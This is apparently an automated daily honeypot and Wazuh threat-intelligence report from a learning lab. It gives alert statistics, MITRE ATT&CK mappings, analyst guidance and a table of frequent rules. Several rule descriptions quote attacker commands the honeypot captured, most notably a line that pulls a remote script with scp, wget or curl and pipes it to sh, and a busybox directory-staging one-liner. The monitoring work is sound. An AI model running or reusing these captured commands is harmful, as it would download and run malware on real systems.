# LearningLab01 Daily Threat Intelligence Report — 2026-10-17

Generated: 2026-10-17T13:15:05.107Z

Report window: 2026-10-16T13:15:05.047Z through 2026-10-17T13:15:05.047Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 268,093 |
| Attack-related alerts | 24,611 |
| Honeypot interactions | 250,640 |
| Authentication failures | 2,393 |
| Authentication successes | 435 |
| Critical alerts | 118 |
| High alerts | 347 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 118 critical-severity alerts require priority review.
- 347 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 5.50:1.
- Country attribution currently covers only 0.19% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (172,689 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 118 | 0.04% |
| High | 347 | 0.13% |
| Medium | 2,232 | 0.83% |
| Low | 265,396 | 98.99% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 2,393
- Authentication successes: 435
- Failure-to-success ratio: 5.50:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 20,232 | 82.21% |
| Payload delivery | 20,232 | 82.21% |
| Authentication failure | 2,393 | 9.72% |
| Command execution | 1,216 | 4.94% |
| Reconnaissance | 415 | 1.69% |
| Network scan | 282 | 1.15% |
| Malware | 99 | 0.40% |
| Web attack | 61 | 0.25% |
| SMTP attack | 20 | 0.08% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 504 alerts, representing 0.19% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 267,589 | 99.81% | Not geolocated |
| Germany | 195 | 0.07% | ████████████████████ |
| United Kingdom | 87 | 0.03% | █████████ |
| Romania | 78 | 0.03% | ████████ |
| Bulgaria | 77 | 0.03% | ████████ |
| United States | 44 | 0.02% | █████ |
| Hong Kong | 8 | 0.00% | █ |
| China | 5 | 0.00% | █ |
| Russia | 3 | 0.00% | █ |
| Singapore | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Armenia | 1 | 0.00% | █ |
| Iran | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 306 |
| Privilege Escalation | 305 |
| Initial Access | 297 |
| Persistence | 297 |
| Lateral Movement | 97 |
| Credential Access | 39 |
| Impact | 32 |
| Execution | 22 |
| Command and Control | 9 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 297 |
| Remote Services | 97 |
| Brute Force | 39 |
| Stored Data Manipulation | 32 |
| Command and Scripting Interpreter | 22 |
| Ingress Tool Transfer | 9 |
| Sudo and Sudo Caching | 8 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 172,689 | T-Pot RDP connection from [IP address] to port 3389. | tpot (172,689) |
| 110204 | 4 | 43,498 | T-Pot Honeytrap connection from [IP address] to port 5901 | tpot (43,498) |
| 110205 | 6 | 20,161 | T-Pot Honeytrap received a payload from [IP address] | tpot (20,161) |
| 110101 | 3 | 12,265 | Cowrie SSH connection from [IP address]. | tpot (12,265) |
| 110207 | 5 | 12,155 | T-Pot SentryPeer SIP activity from [IP address]:51670, method INVITE | tpot (12,155) |
| 110102 | 5 | 2,393 | Cowrie failed login from [IP address] using username admin. | tpot (2,393) |
| 110104 | 7 | 1,067 | Cowrie captured a command from [IP address]: config terminal | tpot (1,067) |
| 110201 | 4 | 732 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (732) |
| 110219 | 4 | 363 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (363) |
| 110214 | 9 | 280 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (280) |
| 533 | 7 | 238 | Listened ports status (netstat) changed (new port opened or closed). | tpot (235), wazuh (3) |
| 5501 | 3 | 200 | PAM: Login session opened. | tpot (193), wazuh (7) |
| 5502 | 3 | 185 | PAM: Login session closed. | tpot (178), wazuh (7) |
| 110215 | 4 | 178 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (178) |
| 110216 | 4 | 158 | T-Pot Mailoney received SMTP command from [IP address]:   | tpot (158) |
| 110103 | 10 | 138 | Cowrie accepted login from [IP address] using username root. | tpot (138) |
| 203 | 9 | 119 | Agent event queue is full. Events may be lost. | tpot (119) |
| 110109 | 13 | 118 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: crontab -l | tpot (118) |
| 2904 | 7 | 115 | Dpkg (Debian Package) half configured. | tpot (83), wazuh (32) |
| 110209 | 5 | 110 | T-Pot Conpot IEC104 event from [IP address]: NEW_CONNECTION | tpot (110) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (95), wazuh (2) |
| 110221 | 7 | 92 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (92) |
| 510 | 7 | 83 | Host-based anomaly detection event (rootcheck). | wazuh (80), tpot (3) |
| 110212 | 10 | 71 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (71) |
| 2902 | 7 | 70 | New dpkg (Debian Package) installed. | tpot (53), wazuh (17) |
| 110105 | 12 | 68 | Cowrie captured a file download from [IP address]. | tpot (68) |
| 52002 | 3 | 66 | Apparmor DENIED | wazuh (66) |
| 110223 | 5 | 57 | T-Pot HoneyAML received  request from  to  on port . | tpot (57) |
| 110220 | 8 | 49 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (49) |
| 110106 | 10 | 39 | Cowrie detected repeated failed logins from [IP address]. | tpot (39) |
| 202 | 7 | 38 | Agent event queue is 90% full. | tpot (38) |
| 205 | 3 | 38 | Agent event queue is back to normal load. | tpot (38) |
| 592 | 8 | 32 | Log file size reduced. | tpot (32) |
| 110108 | 12 | 22 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x54\x55\x4e\x51\x57' | tpot (22) |
| 110208 | 7 | 21 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5076 | tpot (21) |
| 110217 | 7 | 20 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: rcpt to:<cpsavedata@proton.me>  | tpot (20) |
| 2901 | 3 | 19 | New dpkg (Debian Package) requested to install. | tpot (18), wazuh (1) |
| 86003 | 3 | 17 | Docker: Error message | tpot (17) |
| 110107 | 12 | 9 | Cowrie captured a probable payload-retrieval command from [IP address]: UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B" | tpot (9) |
| 5402 | 3 | 8 | Successful sudo to ROOT executed. | tpot (4), wazuh (4) |
| 110224 | 7 | 4 | T-Pot HoneyAML received an HTTP POST from [IP address] to /api/v1/account/forgot-password. | tpot (4) |
| 110211 | 9 | 2 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (2) |
| 502 | 3 | 2 | Wazuh server started. | wazuh (2) |
| 503 | 3 | 2 | Wazuh agent started. | tpot (2) |
| 19004 | 7 | 1 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 40704 | 5 | 1 | Systemd: Service exited due to a failure. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
